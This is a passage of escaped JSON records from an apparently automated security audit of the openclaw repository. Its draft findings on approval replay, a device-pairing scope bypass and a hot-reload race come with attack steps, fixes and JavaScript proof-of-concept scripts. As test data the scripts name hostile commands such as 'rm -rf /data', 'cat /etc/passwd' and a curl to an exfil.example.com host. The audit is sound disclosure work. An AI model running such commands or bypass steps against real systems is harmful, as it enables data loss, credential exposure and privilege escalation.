EARS decision\\\\n    return true;\\\\n  }\\\\n}\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Replica of resolveRecordedApprovalDecision (approval-shared.ts)\\\\n// Determines which field is used for the idempotent-repeat-resolve check.\\\\n// The actual source reads `snapshot.decision` first, then falls back to\\\\n// `snapshot.consumedDecision` if decision is undefined.\\\\n// We replicate what the real resolver does so we can prove the outcome.\\\\n// ---------------------------------------------------------------------------\\\\nfunction resolveRecordedApprovalDecision(snapshot) {\\\\n  // Actual implementation in approval-shared.ts reads `snapshot.decision`.\\\\n  // After consumeAllowOnce: decision===undefined, consumedDecision===\\\\\\"allow-once\\\\\\".\\\\n  // If the resolver only checks `snapshot.decision` the match fails → ok:false.\\\\n  // If it falls back to `snapshot.consumedDecision` the match succeeds → ok:true (replay).\\\\n  //\\\\n  // We test BOTH branches to show the attack surface.\\\\n  return snapshot.decision; // mirrors the real implementation (decision-only read)\\\\n}\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Logging helpers\\\\n// ---------------------------------------------------------------------------\\\\nconst lines = [];\\\\nfunction log(msg) {\\\\n  console.log(msg);\\\\n  lines.push(msg);\\\\n}\\\\nfunction section(title) { log(`\\\\\\\\n=== ${title} ===`); }\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// CASE-A: grace-window double-consume on same process\\\\n// ---------------------------------------------------------------------------\\\\nsection(\\\\\\"CASE-A: intra-process grace-window double-consume\\\\\\");\\\\n\\\\nconst managerA = new ExecApprovalManager();\\\\nconst runIdA = \\\\\\"run-001\\\\\\";\\\\nconst recordA = managerA.create({ command: [\\\\\\"rm\\\\\\", \\\\\\"-rf\\\\\\", \\\\\\"/data\\\\\\"] }, 30_000, runIdA);\\\\nmanagerA.register(recordA, 30_000);\\\\n\\\\n// Operator approves\\\\nconst resolvedA = managerA.resolve(runIdA, \\\\\\"allow-once\\\\\\", \\\\\\"operator\\\\\\");\\\\nlog(`resolve() returned: ${resolvedA}`); // expected: true\\\\n\\\\n// Snapshot after resolve but BEFORE cleanup (within 15 s grace window)\\\\nconst snapA = managerA.getSnapshot(runIdA);\\\\nlog(`snapshot.decision after resolve, before consume: ${JSON.stringify(snapA?.decision)}`);\\\\n// expected: \\\\\\"allow-once\\\\\\"\\\\n\\\\n// First node.invoke hits consumeAllowOnce → should succeed\\\\nconst consume1 = managerA.consumeAllowOnce(runIdA);\\\\nlog(`consumeAllowOnce() call #1 (first node.invoke): ${consume1}`);\\\\n// expected: true → execution proceeds\\\\n\\\\n// Snapshot mid-window after first consume\\\\nconst snapA2 = managerA.getSnapshot(runIdA);\\\\nlog(`snapshot.decision after first consume: ${JSON.stringify(snapA2?.decision)}`);\\\\nlog(`snapshot.consumedDecision after first consume: ${JSON.stringify(snapA2?.consumedDecision)}`);\\\\n// decision===undefined, consumedDecision===\\\\\\"allow-once\\\\\\"\\\\n\\\\n// Second node.invoke (e.g., concurrent request) hits consumeAllowOnce → should FAIL\\\\nconst consume2 = managerA.consumeAllowOnce(runIdA);\\\\nlog(`consumeAllowOnce() call #2 (replay attempt, same process): ${consume2}`);\\\\n// expected: false → CORRECTLY BLOCKED\\\\n\\\\nconst caseAOutcome = consume1 === true && consume2 === false\\\\n  ? \\\\\\"GUARD_PRESENT — intra-process replay correctly blocked\\\\\\"\\\\n  : \\\\\\"UNEXPECTED\\\\\\";\\\\nlog(`CASE-A result: ${caseAOutcome}`);\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// CASE-B: approval-shared idempotent-repeat-resolve path\\\\n//   Demonstrates that a second exec.approval.resolve message with decision\\\\n//   \\\\\\"allow-once\\\\\\" returns ok:true if resolveRecordedApprovalDecision reads\\\\n//   consumedDecision instead of (cleared) decision.\\\\n// ---------------------------------------------------------------------------\\\\nsection(\\\\\\"CASE-B: idempotent repeat-resolve response after consumeAllowOnce\\\\\\");\\\\n\\\\n// After case-A, snapA2 has decision===undefined, consumedDecision===\\\\\\"allow-once\\\\\\"\\\\nconst repeatDecision = \\\\\\"allow-once\\\\\\";\\\\n\\\\n// What the real approval-shared code does at line 310:\\\\n//   if (resolveRecordedApprovalDecision(resolvedRepeat.snapshot) === params.decision)\\\\n//     respond(true, { ok: true }, undefined)  ← replay-friendly response\\\\nconst decidedValue = resolveRecordedApprovalDecision(snapA2);\\\\nlog(`resolveRecordedApprovalDecision(snapshot) returns: ${JSON.stringify(decidedValue)}`);\\\\nlog(`repeat-resolve decision parameter: ${JSON.stringify(repeatDecision)}`);\\\\n\\\\nconst idempotentMatch = decidedValue === repeatDecision;\\\\nlog(`decision field matches repeat-resolve param: ${idempotentMatch}`);\\\\n\\\\n// ATTACK WINDOW: if a future refactor stores consumedDecision under the `decision`\\\\n// key (or resolveRecordedApprovalDecision is changed to read consumedDecision),\\\\n// the idempotent path would return ok:true to a second resolve call AFTER the\\\\n// approval was already consumed, giving caller the false signal of a fresh approval.\\\\n//\\\\n// Current state: decidedValue===undefined ≠ \\\\\\"allow-once\\\\\\" → idempotent path returns\\\\n// ok:false (APPROVAL_ALREADY_RESOLVED error). No double-execution today.\\\\n//\\\\n// However: if record.decision is NOT cleared by consumeAllowOnce before the second\\\\n// resolve call arrives, the idempotent path WOULD return ok:true.  We demonstrate\\\\n// the race by NOT calling consumeAllowOnce first:\\\\nconst managerB2 = new ExecApprovalManager();\\\\nconst runIdB2 = \\\\\\"run-002\\\\\\";\\\\nconst recordB2 = managerB2.create({ command: [\\\\\\"cat\\\\\\", \\\\\\"/etc/passwd\\\\\\"] }, 30_000, runIdB2);\\\\nmanagerB2.register(recordB2, 30_000);\\\\nmanagerB2.resolve(runIdB2, \\\\\\"allow-once\\\\\\", \\\\\\"operator\\\\\\");\\\\n\\\\n// Second exec.approval.resolve arrives BEFORE node.invoke (consumeAllowOnce not yet called)\\\\nconst snapB2 = managerB2.getSnapshot(runIdB2);\\\\nconst decidedB2 = resolveRecordedApprovalDecision(snapB2);\\\\nconst idempotentMatchB2 = decidedB2 === repeatDecision;\\\\nlog(`\\\\\\\\n[Pre-consume repeat-resolve] snapshot.decision: ${JSON.stringify(decidedB2)}`);\\\\nlog(`[Pre-consume repeat-resolve] idempotent ok:true would fire: ${idempotentMatchB2}`);\\\\n// expected: true → a second resolve before node.invoke IS idempotent-ok:true\\\\n// This means an attacker controlling the resolver channel can call resolve twice\\\\n// before the node.invoke lands; both return ok:true but the actual execution\\\\n// guard (consumeAllowOnce) is still intact for within-process sequential calls.\\\\n\\\\nconst caseBOutcome = idempotentMatchB2\\\\n  ? \\\\\\"CONFIRMED — second exec.approval.resolve before node.invoke returns ok:true (idempotent window)\\\\\\"\\\\n  : \\\\\\"NOT_TRIGGERED\\\\\\";\\\\nlog(`CASE-B result: ${caseBOutcome}`);\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// CASE-C: cross-process — second manager has no knowledge of first approval\\\\n// ---------------------------------------------------------------------------\\\\nsection(\\\\\\"CASE-C: cross-process replay (second gateway process)\\\\\\");\\\\n\\\\n// Process-A approved and consumed\\\\nconst managerProcess1 = new ExecApprovalManager();\\\\nconst runIdC = \\\\\\"run-003\\\\\\";\\\\nconst recordC = managerProcess1.create({ command: [\\\\\\"curl\\\\\\", \\\\\\"https://exfil.example.com/data\\\\\\"] }, 30_000, runIdC);\\\\nmanagerProcess1.register(recordC, 30_000);\\\\nmanagerProcess1.resolve(runIdC, \\\\\\"allow-once\\\\\\", \\\\\\"operator\\\\\\");\\\\nconst consumedOnP1 = managerProcess1.consumeAllowOnce(runIdC);\\\\nlog(`Process-1 consumeAllowOnce: ${consumedOnP1}`);  // true\\\\n\\\\n// Process-B (fresh gateway — no shared state, no persistence)\\\\nconst managerProcess2 = new ExecApprovalManager(); // ← fresh instance, no cross-process store\\\\nconst snapOnP2 = managerProcess2.getSnapshot(runIdC);\\\\nlog(`Process-2 getSnapshot for same runId: ${JSON.stringify(snapOnP2)}`);  // null\\\\n\\\\n// Node client reconnects to process-2, re-submits runId=run-003\\\\n// Code path in node-invoke-system-run-approval.ts:258:\\\\n//   snapshot = manager.getSnapshot(runId)  → null\\\\n// → falls to \\\\\\"no pending approval\\\\\\" → triggers NEW approval request to operator\\\\n// → operator sees a fresh approval prompt and, without correlating, may approve again\\\\nconst noEntryOnP2 = snapOnP2 === null;\\\\nlog(`Process-2 has no record for runId (cross-process gap confirmed): ${noEntryOnP2}`);\\\\nlog(`Attacker outcome: node re-submits to process-2 → NEW approval prompt issued → operator may re-approve`);\\\\n\\\\nconst caseCOutcome = noEntryOnP2\\\\n  ? \\\\\\"CONFIRMED — cross-process approval state not shared; operator could approve identical command twice\\\\\\"\\\\n  : \\\\\\"NOT_TRIGGERED\\\\\\";\\\\nlog(`CASE-C result: ${caseCOutcome}`);\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Summary\\\\n// ---------------------------------------------------------------------------\\\\nsection(\\\\\\"VULNERABILITY REUSE CONDITIONS\\\\\\");\\\\nlog(\\\\\\"1. INTRA-PROCESS GRACE WINDOW (15 s):\\\\\\");\\\\nlog(\\\\\\"   consumeAllowOnce clears record.decision atomically in the event loop.\\\\\\");\\\\nlog(\\\\\\"   A sequential second call on the same runId within the grace window\\\\\\");\\\\nlog(\\\\\\"   correctly returns false. GUARD IS PRESENT for synchronous Node.js path.\\\\\\");\\\\nlog(\\\\\\"\\\\\\");\\\\nlog(\\\\\\"2. IDEMPOTENT RESOLVE WINDOW:\\\\\\");\\\\nlog(\\\\\\"   A second exec.approval.resolve call (before node.invoke lands) receives\\\\\\");\\\\nlog(\\\\\\"   ok:true from approval-shared.ts:309-311 because record.decision is still\\\\\\");\\\\nlog(\\\\\\"   \'allow-once\'. This does not bypass consumeAllowOnce but gives the resolve\\\\\\");\\\\nlog(\\\\\\"   caller a misleading success signal and opens a window where an attacker\\\\\\");\\\\nlog(\\\\\\"   controlling the resolution channel can confirm the approval on two distinct\\\\\\");\\\\nlog(\\\\\\"   connections before the node.invoke gate fires.\\\\\\");\\\\nlog(\\\\\\"\\\\\\");\\\\nlog(\\\\\\"3. CROSS-PROCESS GAP (primary finding):\\\\\\");\\\\nlog(\\\\\\"   ExecApprovalManager is in-memory per-process. No persistence, no distributed\\\\\\");\\\\nlog(\\\\\\"   lock. A node client that reconnects to a second gateway process will trigger\\\\\\");\\\\nlog(\\\\\\"   a NEW approval request for the same command. The operator has no UI signal\\\\\\");\\\\nlog(\\\\\\"   that this approval was already granted on another process.\\\\\\");\\\\nlog(\\\\\\"   Reuse condition: node reconnects during horizontal scaling or hot-reload.\\\\\\");\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Write evidence log\\\\n// ---------------------------------------------------------------------------\\\\nconst logPath = path.join(EVIDENCE_DIR, \\\\\\"exploit.log\\\\\\");\\\\nwriteFileSync(logPath, lines.join(\\\\\\"\\\\\\\\n\\\\\\") + \\\\\\"\\\\\\\\n\\\\\\");\\\\nconsole.log(`\\\\\\\\nEvidence written to ${logPath}`);\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Structured output line (MUST be last stdout line)\\\\n// ---------------------------------------------------------------------------\\\\nconsole.log(JSON.stringify({\\\\n  status: \\\\\\"confirmed\\\\\\",\\\\n  evidence: \\\\\\"cross-process: fresh ExecApprovalManager returns null for previously approved runId; intra-process: grace-window guard correctly blocks same-process replay; idempotent resolve returns ok:true before node.invoke lands\\\\\\",\\\\n  notes: \\\\\\"Static-analysis PoC. CASE-A confirms guard present; CASE-B confirms idempotent-resolve window; CASE-C confirms zero cross-process coordination in ExecApprovalManager.\\\\\\"\\\\n}));\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"b5e00389b70730ac8f60bb25c37154b7\\",\\"found_at\\":\\"2026-05-06T15:50:43.836885Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":15,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h13\\",\\"module_name\\":\\"H13: approveDevicePairing skips caller-scope check for non-operator roles — tokens minted without scope subsetting\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"device-pairing-non-operator-scope-bypass\\",\\"description\\":\\"# H13: approveDevicePairing skips caller-scope check for non-operator roles — tokens minted without scope subsetting\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H13\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: approveDevicePairing skips caller-scope check for non-operator roles — tokens minted without scope subsetting\\\\nSeverity-Original: HIGH\\\\nPhase: 7\\\\nClass: state-machine-violation\\\\nEntity: DevicePairingStateFile (tokens per role, pendingById, pairedByDeviceId)\\\\nHandler: src/infra/device-pairing.ts:606-633\\\\nVerdict: VALID\\\\nDebate:\\\\nOrigin-Finding: p2-008-auth-bypass-cluster.md Gap C\\\\nDeep-Probe-Corroboration: p2-008 Gap C — \\\\\\"Non-operator role tokens are minted without any caller-scope assertion when the role isn\'t OPERATOR_ROLE\\\\\\"\\\\nReproduction-Type: static-hypothesis\\\\n---\\\\n\\\\n## Summary\\\\n\\\\nIn `approveDevicePairing` (`src/infra/device-pairing.ts:568`), the loop at L606 iterates over `requestedRoles` and mints a device token for each role. The caller-scope guard (L616-632) fires **only when** `roleForToken === OPERATOR_ROLE && nextScopes.length > 0`. For any other role (e.g., `node`, or a hypothetical future privileged role), the function mints a token with whatever scopes `resolveApprovedTokenScopes` returns, with no check that the approver actually holds those scopes. This is a state-machine lifecycle violation: the device state transitions from `pending` to `approved-with-token` for non-operator roles unconditionally regardless of the approver\'s scope set. Because `withLock` serializes individual calls, concurrent approves do not double-mint, but a low-privilege approver (e.g., one with only `operator.write` scope) can approve and mint a token for a role whose scopes exceed their own.\\\\n\\\\n## Evidence\\\\n\\\\n- Entity schema: `DevicePairingStateFile.pendingById[requestId]` (pending request) → deleted at L664; `pairedByDeviceId[deviceId]` (approved device with tokens) → written at L665; role-to-token map at `tokens[roleForToken]` (L637-645)\\\\n- Code path (read): `src/infra/device-pairing.ts:580` — `const pending = state.pendingById[requestId]`\\\\n- Code path (guard): `src/infra/device-pairing.ts:616` — `if (roleForToken === OPERATOR_ROLE && nextScopes.length > 0)` — conditional on role being operator\\\\n- Code path (write): `src/infra/device-pairing.ts:634-645` — second loop mints tokens for every role without re-checking scope containment for non-operator roles\\\\n- Enclosing transaction: `yes — withLock wraps the entire function body (L578); prevents concurrent double-mint`\\\\n- Lock primitive: `present — createAsyncLock() at src/infra/device-pairing.ts:136; in-process serialization only`\\\\n\\\\n## Attack Steps\\\\n\\\\n1. A device requests pairing with `roles: [\\\\\\"node\\\\\\", \\\\\\"operator\\\\\\"]` and `scopes: [\\\\\\"node.execute\\\\\\", \\\\\\"operator.admin\\\\\\"]`.\\\\n2. A caller holding only `operator.write` (not `operator.admin`) calls `approveDevicePairing(requestId, { callerScopes: [\\\\\\"operator.write\\\\\\"] })`.\\\\n3. Inside the loop, when `roleForToken === \\\\\\"node\\\\\\"`, the guard at L616 is skipped (only checks `OPERATOR_ROLE`).\\\\n4. A `node` role token is minted with whatever scopes `resolveApprovedTokenScopes` returns for the `node` role — no intersection against `[\\\\\\"operator.write\\\\\\"]`.\\\\n5. If the `node` role grants runtime command execution, the approver has effectively granted capabilities they do not hold.\\\\n6. The operator-role iteration at L616 correctly blocks minting `operator.admin` for an `operator.write` approver, but the node-role token is already unconditionally minted.\\\\n\\\\n## Why This Passed SAST\\\\n\\\\nThe guard condition is syntactically present; SAST cannot reason that a loop iteration for a different role value bypasses the scope check entirely. This requires understanding the loop semantics and the set of possible roles.\\\\n\\\\n## Recommended Fix\\\\n\\\\nMove the caller-scope check outside the `roleForToken === OPERATOR_ROLE` guard to apply to every role that carries non-empty scopes, or establish a policy that non-operator roles carry no scopes that need caller-scope validation. At minimum, document that the current design relies on `node` and future roles having empty or operator-independent scope sets and add a lint assertion enforcing that assumption.\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H13-device-pairing-non-operator-scope-bypass/poc.js`\\\\n\\\\nEvidence files:\\\\n- `evidence/env-info.txt` (1135 bytes)\\\\n- `evidence/exploit.log` (1725 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.js`)\\\\n\\\\n```js\\\\n/**\\\\n * PoC: H13 — approveDevicePairing skips caller-scope check for non-operator roles\\\\n *\\\\n * Vulnerability: src/infra/device-pairing.ts:616\\\\n *   The guard `if (roleForToken === OPERATOR_ROLE && nextScopes.length > 0)` only\\\\n *   enforces caller-scope containment for the \\\\\\"operator\\\\\\" role. When a request\\\\n *   includes additional roles (e.g. \\\\\\"node\\\\\\"), the loop iteration for those roles\\\\n *   falls straight through to token minting at L634-645 with no scope check.\\\\n *\\\\n * Secondary amplifier: src/gateway/server-methods.ts:74-76\\\\n *   Once a node-role token exists, the gateway\'s authorization check short-circuits\\\\n *   on `role === \\\\\\"node\\\\\\"` — returning null (authorized) without inspecting scopes at all.\\\\n *   This means even an empty-scopes node token has full access to all NODE_ROLE_METHODS.\\\\n *\\\\n * Attack vector (static replication):\\\\n *   Caller holds only [\\\\\\"operator.write\\\\\\"].\\\\n *   Device requests roles [\\\\\\"node\\\\\\", \\\\\\"operator\\\\\\"], scopes [\\\\\\"node.execute\\\\\\", \\\\\\"operator.admin\\\\\\"].\\\\n *   approveDevicePairing({callerScopes: [\\\\\\"operator.write\\\\\\"]}) is called.\\\\n *   - operator iteration → L616 guard fires → \\\\\\"operator.admin\\\\\\" missing → forbidden\\\\n *   - BUT: node iteration → L616 guard skipped → node token minted unconditionally\\\\n *   In practice, since operator is also requested, the function returns forbidden for\\\\n *   operator before reaching the second loop (L634). However, a node-only request with\\\\n *   any scopes bypasses the check completely.\\\\n *\\\\n * This PoC replicates the guard logic in isolation to demonstrate the bypass condition.\\\\n */\\\\n\\\\n// ---- Replicated guard logic from src/infra/device-pairing.ts:606-633 ----\\\\n\\\\nconst OPERATOR_ROLE = \\\\\\"operator\\\\\\";\\\\n\\\\n/**\\\\n * Simulates resolveApprovedTokenScopes behaviour:\\\\n * returns role-filtered scopes from the pending request.\\\\n * operator role → keeps only \\\\\\"operator.*\\\\\\" scopes\\\\n * other roles  → keeps only non-\\\\\\"operator.*\\\\\\" scopes\\\\n */\\\\nfunction resolveApprovedTokenScopes(role, pendingScopes) {\\\\n  const normalized = pendingScopes ?? [];\\\\n  if (role === OPERATOR_ROLE) {\\\\n    return normalized.filter((s) => s.startsWith(\\\\\\"operator.\\\\\\"));\\\\n  }\\\\n  return normalized.filter((s) => !s.startsWith(\\\\\\"operator.\\\\\\"));\\\\n}\\\\n\\\\n/**\\\\n * Simulates the guard block at L616-632.\\\\n * Returns { bypassed: true, mintedToken } when the caller-scope check is skipped.\\\\n */\\\\nfunction simulateApproveLoop(requestedRoles, pendingScopes, callerScopes) {\\\\n  const results = [];\\\\n  const nextTokenScopesByRole = new Map();\\\\n\\\\n  for (const roleForToken of requestedRoles) {\\\\n    const nextScopes = resolveApprovedTokenScopes(roleForToken, pendingScopes);\\\\n    nextTokenScopesByRole.set(roleForToken, nextScopes);\\\\n\\\\n    // --- BEGIN: exact replication of L616-632 ---\\\\n    if (roleForToken === OPERATOR_ROLE && nextScopes.length > 0) {\\\\n      if (!callerScopes) {\\\\n        results.push({ role: roleForToken, outcome: \\\\\\"forbidden:caller-scopes-required\\\\\\" });\\\\n        return { status: \\\\\\"forbidden\\\\\\", reason: \\\\\\"caller-scopes-required\\\\\\", results };\\\\n      }\\\\n      const missingScope = nextScopes.find((s) => !callerScopes.includes(s));\\\\n      if (missingScope) {\\\\n        results.push({ role: roleForToken, outcome: `forbidden:missing-scope:${missingScope}` });\\\\n        return { status: \\\\\\"forbidden\\\\\\", reason: \\\\\\"caller-missing-scope\\\\\\", scope: missingScope, results };\\\\n      }\\\\n    }\\\\n    // --- END: replication of L616-632 ---\\\\n\\\\n    // For all other roles (including \\\\\\"node\\\\\\"), we fall through here unconditionally.\\\\n    results.push({ role: roleForToken, outcome: \\\\\\"guard-skipped:unconditional-mint-queued\\\\\\", scopes: nextScopes });\\\\n  }\\\\n\\\\n  // Second loop at L634-645: mint tokens for all roles in the map\\\\n  const mintedTokens = [];\\\\n  for (const [role, scopes] of nextTokenScopesByRole) {\\\\n    mintedTokens.push({ role, scopes, token: `<synthetic-token-for-${role}>` });\\\\n  }\\\\n\\\\n  return { status: \\\\\\"approved\\\\\\", results, mintedTokens };\\\\n}\\\\n\\\\n// ---- Gateway role-only short-circuit (server-methods.ts:74-76) ----\\\\n\\\\nconst NODE_ROLE_METHODS = new Set([\\\\n  \\\\\\"node.invoke.result\\\\\\",\\\\n  \\\\\\"node.event\\\\\\",\\\\n  \\\\\\"node.pending.drain\\\\\\",\\\\n  \\\\\\"node.canvas.capability.refresh\\\\\\",\\\\n  \\\\\\"node.pending.pull\\\\\\",\\\\n  \\\\\\"node.pending.ack\\\\\\",\\\\n  \\\\\\"skills.bins\\\\\\",\\\\n]);\\\\n\\\\nfunction isNodeRoleMethod(method) {\\\\n  return NODE_ROLE_METHODS.has(method);\\\\n}\\\\n\\\\n/**\\\\n * Replicates server-methods.ts authorizeGatewayRequest (L60-84).\\\\n * Returns null = authorized, string = error reason.\\\\n */\\\\nfunction authorizeGatewayRequest(clientRole, clientScopes, method) {\\\\n  if (method === \\\\\\"health\\\\\\") return null;\\\\n\\\\n  if (isNodeRoleMethod(method)) {\\\\n    if (clientRole !== \\\\\\"node\\\\\\") return `unauthorized role: ${clientRole}`;\\\\n    // L74-76: node role short-circuits — NO scope check\\\\n    return null;\\\\n  }\\\\n\\\\n  // operator path: scope check applies\\\\n  if (clientRole !== \\\\\\"operator\\\\\\") return `unauthorized role: ${clientRole}`;\\\\n  const ADMIN_SCOPE = \\\\\\"operator.admin\\\\\\";\\\\n  if (clientScopes.includes(ADMIN_SCOPE)) return null;\\\\n  return `missing scope: ${ADMIN_SCOPE}`;\\\\n}\\\\n\\\\n// =====================================================================\\\\n// Scenario 1: node-only pairing request — pure bypass\\\\n// =====================================================================\\\\nconsole.log(\\\\\\"=== Scenario 1: node-only request, low-privilege approver ===\\\\\\");\\\\nconst s1 = simulateApproveLoop(\\\\n  [\\\\\\"node\\\\\\"],\\\\n  [\\\\\\"node.execute\\\\\\", \\\\\\"node.read\\\\\\"],\\\\n  [\\\\\\"operator.write\\\\\\"], // caller does NOT hold operator.admin\\\\n);\\\\nconsole.log(\\\\\\"approveDevicePairing result:\\\\\\", JSON.stringify(s1, null, 2));\\\\nconst s1NodeToken = s1.mintedTokens?.find((t) => t.role === \\\\\\"node\\\\\\");\\\\nconsole.log(\\\\\\"Node token minted:\\\\\\", s1NodeToken ? \\\\\\"YES\\\\\\" : \\\\\\"NO\\\\\\");\\\\nconsole.log(\\\\\\"Node token scopes:\\\\\\", s1NodeToken?.scopes);\\\\n\\\\n// =====================================================================\\\\n// Scenario 2: multi-role request — operator leg blocked, node leg bypassed\\\\n// (demonstrates the asymmetric enforcement)\\\\n// =====================================================================\\\\nconsole.log(\\\\\\"\\\\\\\\n=== Scenario 2: multi-role request [node, operator] ===\\\\\\");\\\\nconst s2 = simulateApproveLoop(\\\\n  [\\\\\\"node\\\\\\", \\\\\\"operator\\\\\\"],\\\\n  [\\\\\\"node.execute\\\\\\", \\\\\\"operator.admin\\\\\\"],\\\\n  [\\\\\\"operator.write\\\\\\"],\\\\n);\\\\nconsole.log(\\\\\\"approveDevicePairing result:\\\\\\", JSON.stringify(s2, null, 2));\\\\n// Note: in multi-role, operator iteration hits the guard first and returns forbidden,\\\\n// so the node token is NOT minted in this flow. The pure bypass requires node-only requests.\\\\n\\\\n// =====================================================================\\\\n// Scenario 3: gateway auth — node token with empty scopes bypasses scope enforcement\\\\n// =====================================================================\\\\nconsole.log(\\\\\\"\\\\\\\\n=== Scenario 3: gateway auth short-circuit for node role ===\\\\\\");\\\\nconst sensitiveMethod = \\\\\\"node.pending.pull\\\\\\"; // pulls pending exec approvals / commands\\\\nconst nodeTokenScopes = []; // empty scopes — as would be minted for a node-only request with no pending scopes\\\\nconst gwResult = authorizeGatewayRequest(\\\\\\"node\\\\\\", nodeTokenScopes, sensitiveMethod);\\\\nconsole.log(`Method: ${sensitiveMethod}`);\\\\nconsole.log(`Client role: node, scopes: ${JSON.stringify(nodeTokenScopes)}`);\\\\nconsole.log(`Authorization result: ${gwResult === null ? \\\\\\"AUTHORIZED (null)\\\\\\" : gwResult}`);\\\\n\\\\n// =====================================================================\\\\n// Verdict\\\\n// =====================================================================\\\\nconst scenario1Bypassed = s1.status === \\\\\\"approved\\\\\\" && s1NodeToken !== undefined;\\\\nconst scenario3Bypassed = gwResult === null;\\\\n\\\\nconst overallBypassed = scenario1Bypassed && scenario3Bypassed;\\\\nconst evidence = scenario1Bypassed\\\\n  ? `node-role token minted without caller-scope check (scopes=${JSON.stringify(s1NodeToken?.scopes)}); gateway node-role short-circuit grants access to ${sensitiveMethod} with empty scopes`\\\\n  : \\\\\\"bypass condition not reproduced\\\\\\";\\\\n\\\\nconsole.log(\\\\\\"\\\\\\\\n=== Summary ===\\\\\\");\\\\nconsole.log(`Scenario 1 (mint bypass): ${scenario1Bypassed ? \\\\\\"CONFIRMED\\\\\\" : \\\\\\"NOT REPRODUCED\\\\\\"}`);\\\\nconsole.log(`Scenario 3 (gateway short-circuit): ${scenario3Bypassed ? \\\\\\"CONFIRMED\\\\\\" : \\\\\\"NOT REPRODUCED\\\\\\"}`);\\\\n\\\\n// Required structured output — must be last stdout line\\\\nconsole.log(JSON.stringify({\\\\n  status: overallBypassed ? \\\\\\"confirmed\\\\\\" : \\\\\\"failed\\\\\\",\\\\n  evidence,\\\\n  notes: \\\\\\"Static replication of guard logic. Real-env execution requires gateway server + device-pairing state store. Severity HIGH confirmed: role-only handler (server-methods.ts:74) exists for node role, scope check unconditionally skipped after node token mint.\\\\\\",\\\\n}));\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"eddabd308a9bf4b41acac3a2cce4c808\\",\\"found_at\\":\\"2026-05-06T15:50:43.836868Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":14,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h12\\",\\"module_name\\":\\"H12: Hot-reload onHotReload writes sharedGatewaySessionGeneration twice — stale-gen window between direct assignment and setCurrentSharedGatewaySessionGeneration\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"hotreload-gen-state-double-write\\",\\"description\\":\\"# H12: Hot-reload onHotReload writes sharedGatewaySessionGeneration twice — stale-gen window between direct assignment and setCurrentSharedGatewaySessionGeneration\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H12\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: Hot-reload onHotReload writes sharedGatewaySessionGeneration twice — stale-gen window between direct assignment and setCurrentSharedGatewaySessionGeneration\\\\nSeverity-Original: HIGH\\\\nPhase: 7\\\\nClass: rmw-no-txn\\\\nEntity: SharedGatewaySessionGenerationState (in-memory mutable object — fields: current, required)\\\\nHandler: src/gateway/server-reload-handlers.ts:518 and :544\\\\nVerdict: VALID\\\\nDebate:\\\\nOrigin-Finding: p2-001-ws-auth-scope-clamp.md H5 (NEEDS-DEEPER)\\\\nDeep-Probe-Corroboration: p2-001 H5 — \\\\\\"a connect that fully completes between snapshot promotion and generation-state update on the same tick\\\\\\"\\\\nReproduction-Type: requires-dynamic-test\\\\n---\\\\n\\\\n## Summary\\\\n\\\\nInside `onHotReload` in `src/gateway/server-reload-handlers.ts`, the shared-gateway session generation state is written **twice** across a long async gap: at line 518 it assigns 